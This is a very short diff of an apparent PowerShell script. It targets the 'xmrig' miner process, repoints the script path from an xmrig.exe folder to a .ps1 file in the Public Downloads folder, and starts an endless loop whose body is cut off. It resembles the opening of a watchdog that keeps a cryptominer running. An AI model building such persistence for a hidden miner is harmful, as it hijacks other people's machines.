@@ -1,5 +1,5 @@
 $processName = "xmrig"
-$scriptPath = "C:\xmrig\xmrig-6.26.0\xmrig.exe"
+$scriptPath = "C:\Users\Public\Downloads\ring.ps1"
 
 while ($true) {
 
